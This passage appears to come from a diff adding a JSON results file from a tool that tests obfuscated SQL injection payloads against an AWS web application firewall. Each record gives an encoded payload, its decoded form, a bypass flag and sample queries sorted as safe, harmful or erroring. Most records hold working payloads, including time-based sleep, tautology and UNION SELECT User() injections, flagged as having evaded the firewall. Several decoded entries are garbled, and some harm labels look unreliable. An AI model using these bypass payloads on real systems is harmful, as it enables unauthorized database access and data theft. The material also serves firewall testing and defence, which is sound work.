+                "SELECT * FROM users WHERE username = ''\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t'",
+                "SELECT * FROM users WHERE email = ''\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t",
+                "SELECT * FROM orders WHERE amount > '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t AND active = 1",
+                "SELECT * FROM users LIMIT '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t",
+                "SELECT * FROM products LIMIT 10 OFFSET '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t",
+                "SELECT * FROM orders LIMIT '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t OFFSET 0",
+                "SELECT * FROM users ORDER BY '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t",
+                "SELECT * FROM users ORDER BY '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t DESC",
+                "SELECT * FROM '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t WHERE active = 1",
+                "SELECT * FROM users WHERE '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t IS NOT NULL",
+                "SELECT '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t FROM users",
+                "SELECT * FROM users ORDER BY id '\tand\t(select\t1\tfrom\t(select(sleep(5)))A)--\tBD3AB46FFBDCBFDBEAEFECBC1FDEABFAEBFC5DDAE\t"
+            ]
+        }
+    },
+    {
+        "payload": "1%252520OR%2525201%25253D1",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "1 OR 1=1",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1 OR 1=1'",
+                "SELECT * FROM users WHERE email = '1 OR 1=1' AND active = 1"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE id = 1 OR 1=1",
+                "SELECT * FROM orders WHERE amount > 1 OR 1=1 AND active = 1",
+                "SELECT * FROM users ORDER BY 1 OR 1=1",
+                "SELECT * FROM users ORDER BY 1 OR 1=1 DESC",
+                "SELECT * FROM users WHERE 1 OR 1=1 IS NOT NULL",
+                "SELECT 1 OR 1=1 FROM users"
+            ],
+            "error_queries": [
+                "SELECT * FROM users LIMIT 1 OR 1=1",
+                "SELECT * FROM products LIMIT 10 OFFSET 1 OR 1=1",
+                "SELECT * FROM orders LIMIT 1 OR 1=1 OFFSET 0",
+                "SELECT * FROM 1 OR 1=1 WHERE active = 1",
+                "SELECT * FROM users ORDER BY id 1 OR 1=1"
+            ]
+        }
+    },
+    {
+        "payload": "1%2520oR%25201%253d1",
+        "technique": "obf_case_random+obf_double_url_encode_adv_obf_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "1 oR 1=1",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1 oR 1=1'",
+                "SELECT * FROM users WHERE email = '1 oR 1=1' AND active = 1"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE id = 1 oR 1=1",
+                "SELECT * FROM orders WHERE amount > 1 oR 1=1 AND active = 1",
+                "SELECT * FROM users ORDER BY 1 oR 1=1",
+                "SELECT * FROM users ORDER BY 1 oR 1=1 DESC",
+                "SELECT * FROM users WHERE 1 oR 1=1 IS NOT NULL",
+                "SELECT 1 oR 1=1 FROM users"
+            ],
+            "error_queries": [
+                "SELECT * FROM users LIMIT 1 oR 1=1",
+                "SELECT * FROM products LIMIT 10 OFFSET 1 oR 1=1",
+                "SELECT * FROM orders LIMIT 1 oR 1=1 OFFSET 0",
+                "SELECT * FROM 1 oR 1=1 WHERE active = 1",
+                "SELECT * FROM users ORDER BY id 1 oR 1=1"
+            ]
+        }
+    },
+    {
+        "payload": "%2527/%252A%252a/UNiOn/%252a%252A/SElEct/%252A%252A/1%252cUser%2528%2529%252C3--/%252A%252A/",
+        "technique": "obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "'/**/UNiOn/**/SElEct/**/1,User(),3--/**/",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = ''/**/UNiOn/**/SElEct/**/1,User(),3--/**/'",
+                "SELECT * FROM users WHERE email = ''/**/UNiOn/**/SElEct/**/1,User(),3--/**/' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = '/**/UNiOn/**/SElEct/**/1,User(),3--/**/",
+                "SELECT * FROM orders WHERE amount > '/**/UNiOn/**/SElEct/**/1,User(),3--/**/ AND active = 1",
+                "SELECT * FROM users LIMIT '/**/UNiOn/**/SElEct/**/1,User(),3--/**/",
+                "SELECT * FROM products LIMIT 10 OFFSET '/**/UNiOn/**/SElEct/**/1,User(),3--/**/",
+                "SELECT * FROM orders LIMIT '/**/UNiOn/**/SElEct/**/1,User(),3--/**/ OFFSET 0",
+                "SELECT * FROM users ORDER BY '/**/UNiOn/**/SElEct/**/1,User(),3--/**/",
+                "SELECT * FROM users ORDER BY '/**/UNiOn/**/SElEct/**/1,User(),3--/**/ DESC",
+                "SELECT * FROM '/**/UNiOn/**/SElEct/**/1,User(),3--/**/ WHERE active = 1",
+                "SELECT * FROM users WHERE '/**/UNiOn/**/SElEct/**/1,User(),3--/**/ IS NOT NULL",
+                "SELECT '/**/UNiOn/**/SElEct/**/1,User(),3--/**/ FROM users",
+                "SELECT * FROM users ORDER BY id '/**/UNiOn/**/SElEct/**/1,User(),3--/**/"
+            ]
+        }
+    },
+    {
+        "payload": "%25EF%25BD%2581D%25EF%25BC%2590UNIoN%252SElEcT%252B1%252CUser%2528%2529%257c%257C3--",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "aD�%9OUNIoN%2SElEcT+1,User()||3--",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = 'aD�%9OUNIoN%2SElEcT+1,User()||3--'",
+                "SELECT * FROM users WHERE email = 'aD�%9OUNIoN%2SElEcT+1,User()||3--' AND active = 1"
+            ],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = aD�%9OUNIoN%2SElEcT+1,User()||3--",
+                "SELECT * FROM orders WHERE amount > aD�%9OUNIoN%2SElEcT+1,User()||3-- AND active = 1",
+                "SELECT * FROM users LIMIT aD�%9OUNIoN%2SElEcT+1,User()||3--",
+                "SELECT * FROM products LIMIT 10 OFFSET aD�%9OUNIoN%2SElEcT+1,User()||3--",
+                "SELECT * FROM orders LIMIT aD�%9OUNIoN%2SElEcT+1,User()||3-- OFFSET 0",
+                "SELECT * FROM users ORDER BY aD�%9OUNIoN%2SElEcT+1,User()||3--",
+                "SELECT * FROM users ORDER BY aD�%9OUNIoN%2SElEcT+1,User()||3-- DESC",
+                "SELECT * FROM aD�%9OUNIoN%2SElEcT+1,User()||3-- WHERE active = 1",
+                "SELECT * FROM users WHERE aD�%9OUNIoN%2SElEcT+1,User()||3-- IS NOT NULL",
+                "SELECT aD�%9OUNIoN%2SElEcT+1,User()||3-- FROM users",
+                "SELECT * FROM users ORDER BY id aD�%9OUNIoN%2SElEcT+1,User()||3--"
+            ]
+        }
+    },
+    {
+        "payload": "1%25252CUser%252528%252529%25252c3--",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "1,User(),3--",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '1,User(),3--'",
+                "SELECT * FROM users WHERE email = '1,User(),3--' AND active = 1"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users ORDER BY 1,User(),3--",
+                "SELECT * FROM users ORDER BY 1,User(),3-- DESC",
+                "SELECT 1,User(),3-- FROM users"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = 1,User(),3--",
+                "SELECT * FROM orders WHERE amount > 1,User(),3-- AND active = 1",
+                "SELECT * FROM users LIMIT 1,User(),3--",
+                "SELECT * FROM products LIMIT 10 OFFSET 1,User(),3--",
+                "SELECT * FROM orders LIMIT 1,User(),3-- OFFSET 0",
+                "SELECT * FROM 1,User(),3-- WHERE active = 1",
+                "SELECT * FROM users WHERE 1,User(),3-- IS NOT NULL",
+                "SELECT * FROM users ORDER BY id 1,User(),3--"
+            ]
+        }
+    },
+    {
+        "payload": "%25ef%25bd%2581dm%25ef%25bd%2589Ion%2525%25ef%25bc%2592%25ef%25bc%2595%25ef%25bc%2592%25ef%25bc%2597%2525%25ef%25bc%2592%25ef%25bc%2595%25ef%25bc%259",
+        "technique": "Time-based Blind_full_bypass+Boolean-based Blind_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "admiIon'%�%9",
+            "safe_queries": [],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE username = 'admiIon'%�%9'",
+                "SELECT * FROM users WHERE email = 'admiIon'%�%9' AND active = 1",
+                "SELECT * FROM users WHERE id = admiIon'%�%9",
+                "SELECT * FROM orders WHERE amount > admiIon'%�%9 AND active = 1",
+                "SELECT * FROM users LIMIT admiIon'%�%9",
+                "SELECT * FROM products LIMIT 10 OFFSET admiIon'%�%9",
+                "SELECT * FROM orders LIMIT admiIon'%�%9 OFFSET 0",
+                "SELECT * FROM users ORDER BY admiIon'%�%9",
+                "SELECT * FROM users ORDER BY admiIon'%�%9 DESC",
+                "SELECT * FROM admiIon'%�%9 WHERE active = 1",
+                "SELECT * FROM users WHERE admiIon'%�%9 IS NOT NULL",
+                "SELECT admiIon'%�%9 FROM users",
+                "SELECT * FROM users ORDER BY id admiIon'%�%9"
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520uNIOn%2520seLEcT%25201%252cUSEr%2528%2529%252C3--%2520",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass+Boolean-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' uNIOn seLEcT 1,USEr(),3-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' uNIOn seLEcT 1,USEr(),3-- '",
+                "SELECT * FROM users WHERE email = '' uNIOn seLEcT 1,USEr(),3-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' uNIOn seLEcT 1,USEr(),3-- ",
+                "SELECT * FROM orders WHERE amount > ' uNIOn seLEcT 1,USEr(),3--  AND active = 1",
+                "SELECT * FROM users LIMIT ' uNIOn seLEcT 1,USEr(),3-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' uNIOn seLEcT 1,USEr(),3-- ",
+                "SELECT * FROM orders LIMIT ' uNIOn seLEcT 1,USEr(),3--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' uNIOn seLEcT 1,USEr(),3-- ",
+                "SELECT * FROM users ORDER BY ' uNIOn seLEcT 1,USEr(),3--  DESC",
+                "SELECT * FROM ' uNIOn seLEcT 1,USEr(),3--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' uNIOn seLEcT 1,USEr(),3--  IS NOT NULL",
+                "SELECT ' uNIOn seLEcT 1,USEr(),3--  FROM users",
+                "SELECT * FROM users ORDER BY id ' uNIOn seLEcT 1,USEr(),3-- "
+            ]
+        }
+    },
+    {
+        "payload": "%251%EF%BC%ADmin%251%EF%BC%A3--",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_comment_sql+obf_double_url_encode_adv_obf_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "%1Mmin\u001c--",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = '%1Mmin\u001c--'",
+                "SELECT * FROM users WHERE email = '%1Mmin\u001c--' AND active = 1"
+            ],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = %1Mmin\u001c--",
+                "SELECT * FROM orders WHERE amount > %1Mmin\u001c-- AND active = 1",
+                "SELECT * FROM users LIMIT %1Mmin\u001c--",
+                "SELECT * FROM products LIMIT 10 OFFSET %1Mmin\u001c--",
+                "SELECT * FROM orders LIMIT %1Mmin\u001c-- OFFSET 0",
+                "SELECT * FROM users ORDER BY %1Mmin\u001c--",
+                "SELECT * FROM users ORDER BY %1Mmin\u001c-- DESC",
+                "SELECT * FROM %1Mmin\u001c-- WHERE active = 1",
+                "SELECT * FROM users WHERE %1Mmin\u001c-- IS NOT NULL",
+                "SELECT %1Mmin\u001c-- FROM users",
+                "SELECT * FROM users ORDER BY id %1Mmin\u001c--"
+            ]
+        }
+    },
+    {
+        "payload": "AD%EF%BD%82N%250dSET%250aNULL%253A%2540%2521SELECT%2521%2540VERSION%2521%2529%252C3-- /*67*/",
+        "technique": "obf_double_url_encode+obf_url_encode_adv_obf_full_bypass+Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = 'ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/'",
+                "SELECT * FROM users WHERE email = 'ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/' AND active = 1"
+            ],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/",
+                "SELECT * FROM orders WHERE amount > ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/ AND active = 1",
+                "SELECT * FROM users LIMIT ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/",
+                "SELECT * FROM products LIMIT 10 OFFSET ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/",
+                "SELECT * FROM orders LIMIT ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/ OFFSET 0",
+                "SELECT * FROM users ORDER BY ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/",
+                "SELECT * FROM users ORDER BY ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/ DESC",
+                "SELECT * FROM ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/ WHERE active = 1",
+                "SELECT * FROM users WHERE ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/ IS NOT NULL",
+                "SELECT ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/ FROM users",
+                "SELECT * FROM users ORDER BY id ADbN%OdSET%OaNULL:%4O!SELECT!%4OVERSION!),3-- /*67*/"
+            ]
+        }
+    },
+    {
+        "payload": "admIN%2527%252B--",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+Time-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false,
+        "harmness": {
+            "payload": "admIN'+--",
+            "safe_queries": [],
+            "harm_queries": [],
+            "error_queries": [
+                "SELECT * FROM users WHERE username = 'admIN'+--'",
+                "SELECT * FROM users WHERE email = 'admIN'+--' AND active = 1",
+                "SELECT * FROM users WHERE id = admIN'+--",
+                "SELECT * FROM orders WHERE amount > admIN'+-- AND active = 1",
+                "SELECT * FROM users LIMIT admIN'+--",
+                "SELECT * FROM products LIMIT 10 OFFSET admIN'+--",
+                "SELECT * FROM orders LIMIT admIN'+-- OFFSET 0",
+                "SELECT * FROM users ORDER BY admIN'+--",
+                "SELECT * FROM users ORDER BY admIN'+-- DESC",
+                "SELECT * FROM admIN'+-- WHERE active = 1",
+                "SELECT * FROM users WHERE admIN'+-- IS NOT NULL",
+                "SELECT admIN'+-- FROM users",
+                "SELECT * FROM users ORDER BY id admIN'+--"
+            ]
+        }
+    },
+    {
+        "payload": "ADmiN%2527%2520--",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_double_url_encode+obf_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "ADmiN' --",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = 'ADmiN' --'"
+            ],
+            "harm_queries": [
+                "SELECT * FROM users WHERE email = 'ADmiN' --' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ADmiN' --",
+                "SELECT * FROM orders WHERE amount > ADmiN' -- AND active = 1",
+                "SELECT * FROM users LIMIT ADmiN' --",
+                "SELECT * FROM products LIMIT 10 OFFSET ADmiN' --",
+                "SELECT * FROM orders LIMIT ADmiN' -- OFFSET 0",
+                "SELECT * FROM users ORDER BY ADmiN' --",
+                "SELECT * FROM users ORDER BY ADmiN' -- DESC",
+                "SELECT * FROM ADmiN' -- WHERE active = 1",
+                "SELECT * FROM users WHERE ADmiN' -- IS NOT NULL",
+                "SELECT ADmiN' -- FROM users",
+                "SELECT * FROM users ORDER BY id ADmiN' --"
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520UnIon%2520SELect%25201%252cUser%2528%2529%252C3--%2520",
+        "technique": "obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass+obf_whitespace_url+obf_comment_sql_version+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' UnIon SELect 1,User(),3-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' UnIon SELect 1,User(),3-- '",
+                "SELECT * FROM users WHERE email = '' UnIon SELect 1,User(),3-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' UnIon SELect 1,User(),3-- ",
+                "SELECT * FROM orders WHERE amount > ' UnIon SELect 1,User(),3--  AND active = 1",
+                "SELECT * FROM users LIMIT ' UnIon SELect 1,User(),3-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' UnIon SELect 1,User(),3-- ",
+                "SELECT * FROM orders LIMIT ' UnIon SELect 1,User(),3--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' UnIon SELect 1,User(),3-- ",
+                "SELECT * FROM users ORDER BY ' UnIon SELect 1,User(),3--  DESC",
+                "SELECT * FROM ' UnIon SELect 1,User(),3--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' UnIon SELect 1,User(),3--  IS NOT NULL",
+                "SELECT ' UnIon SELect 1,User(),3--  FROM users",
+                "SELECT * FROM users ORDER BY id ' UnIon SELect 1,User(),3-- "
+            ]
+        }
+    },
+    {
+        "payload": "%25ef%25bd%2581d%25ef%25bc%2593%25ef%25bc%2594%25ef%25bd%2581%25ef%25bd%258d%25ef%25bd%2589n%2525%25ef%25bc%2592%25ef%25bc%2595%25ef%25bc%2592%25ef",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass+Time-based Blind_full_bypass+obf_case_random+obf_comment_sql_version+obf_double_url_encode_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "ad34amin%2�",
+            "safe_queries": [
+                "SELECT * FROM users WHERE username = 'ad34amin%2�'",
+                "SELECT * FROM users WHERE email = 'ad34amin%2�' AND active = 1"
+            ],
+            "harm_queries": [
+                "SELECT ad34amin%2� FROM users"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ad34amin%2�",
+                "SELECT * FROM orders WHERE amount > ad34amin%2� AND active = 1",
+                "SELECT * FROM users LIMIT ad34amin%2�",
+                "SELECT * FROM products LIMIT 10 OFFSET ad34amin%2�",
+                "SELECT * FROM orders LIMIT ad34amin%2� OFFSET 0",
+                "SELECT * FROM users ORDER BY ad34amin%2�",
+                "SELECT * FROM users ORDER BY ad34amin%2� DESC",
+                "SELECT * FROM ad34amin%2� WHERE active = 1",
+                "SELECT * FROM users WHERE ad34amin%2� IS NOT NULL",
+                "SELECT * FROM users ORDER BY id ad34amin%2�"
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520and%2520%2528select%25201%2520from%2520%2528select%2528sleep%25285%2529%2529%2529A%2529--%2520",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' and (select 1 from (select(sleep(5)))A)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' and (select 1 from (select(sleep(5)))A)-- '",
+                "SELECT * FROM users WHERE email = '' and (select 1 from (select(sleep(5)))A)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM orders WHERE amount > ' and (select 1 from (select(sleep(5)))A)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM orders LIMIT ' and (select 1 from (select(sleep(5)))A)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' and (select 1 from (select(sleep(5)))A)-- ",
+                "SELECT * FROM users ORDER BY ' and (select 1 from (select(sleep(5)))A)--  DESC",
+                "SELECT * FROM ' and (select 1 from (select(sleep(5)))A)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' and (select 1 from (select(sleep(5)))A)--  IS NOT NULL",
+                "SELECT ' and (select 1 from (select(sleep(5)))A)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' and (select 1 from (select(sleep(5)))A)-- "
+            ]
+        }
+    },
+    {
+        "payload": "%252527%252520anD%252520%252528SelECT%2525201%252520frOm%252520%252528sElECt%252528SLeeP%2525285%252529%252529%252529A%252529--%252520",
+        "technique": "obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+obf_case_random+obf_double_url_encode_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)-- '",
+                "SELECT * FROM users WHERE email = '' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)-- ",
+                "SELECT * FROM orders WHERE amount > ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)-- ",
+                "SELECT * FROM orders LIMIT ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)-- ",
+                "SELECT * FROM users ORDER BY ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)--  DESC",
+                "SELECT * FROM ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)--  IS NOT NULL",
+                "SELECT ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' anD (SelECT 1 frOm (sElECt(SLeeP(5)))A)-- "
+            ]
+        }
+    },
+    {
+        "payload": "%2527%2520AND%2520%2528SELECT%25201%2520FROM%2520%2528SELECT%2528SLEEP%25285%2529%2529%2529a%2529--%2520",
+        "technique": "Time-based Blind_full_bypass+obf_double_url_encode+obf_whitespace_url+obf_comment_sql_full_bypass+Boolean-based Blind_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
+            "payload": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+            "safe_queries": [],
+            "harm_queries": [
+                "SELECT * FROM users WHERE username = '' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- '",
+                "SELECT * FROM users WHERE email = '' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ' AND active = 1"
+            ],
+            "error_queries": [
+                "SELECT * FROM users WHERE id = ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+                "SELECT * FROM orders WHERE amount > ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  AND active = 1",
+                "SELECT * FROM users LIMIT ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+                "SELECT * FROM products LIMIT 10 OFFSET ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+                "SELECT * FROM orders LIMIT ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  OFFSET 0",
+                "SELECT * FROM users ORDER BY ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- ",
+                "SELECT * FROM users ORDER BY ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  DESC",
+                "SELECT * FROM ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  WHERE active = 1",
+                "SELECT * FROM users WHERE ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  IS NOT NULL",
+                "SELECT ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--  FROM users",
+                "SELECT * FROM users ORDER BY id ' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- "
+            ]
+        }
+    },
+    {
+        "payload": "1%2526id%253DADmiN%2527/%252A%252a/--",
+        "technique": "Union Select Null Bytes_adv_obf_full_bypass",
+        "attack_type": "sql_injection",
+        "waf": "AWS",
+        "phase": "PHASE_1",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": true,
+        "harmness": {
